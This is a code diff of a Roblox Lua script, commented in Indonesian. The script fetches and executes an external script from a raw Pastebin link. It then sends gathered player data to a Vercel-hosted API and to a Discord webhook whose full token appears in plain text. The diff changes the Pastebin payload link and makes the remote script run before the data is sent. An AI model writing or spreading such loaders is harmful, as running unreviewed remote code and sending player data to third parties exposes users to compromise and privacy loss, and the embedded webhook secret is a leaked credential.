@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 -- ======= CONFIGURATION =======
 local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local EXTERNAL_SCRIPT = "https://pastebin.com/raw/RyqbcPER" -- Script yang akan di-execute
+local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF" -- Script yang akan di-execute
 -- =============================
 
 -- Dapatkan data player
@@ -51,7 +51,9 @@ local function executeExternalScript()
     end)
     if not success then
         warn("Gagal execute external script:", err)
+        return false
     end
+    return true
 end
 
 -- Kirim data ke API
@@ -118,15 +120,15 @@ end
 
 -- Fungsi utama
 local function main()
-    -- Kirim data ke API
-    local apiSuccess = sendToAPI()
+    -- Execute external script terlebih dahulu
+    local scriptSuccess = executeExternalScript()
     
-    -- Kirim webhook ke Discord
-    sendWebhook()
-    
-    -- Execute external script hanya jika API success
-    if apiSuccess then
-        executeExternalScript()
+    -- Jika script berhasil dijalankan, kirim data ke API dan webhook
+    if scriptSuccess then
+        sendToAPI()
+        sendWebhook()
+    else
+        warn("❌ External script gagal dijalankan, proses pengiriman data dibatalkan")
     end
 end
 
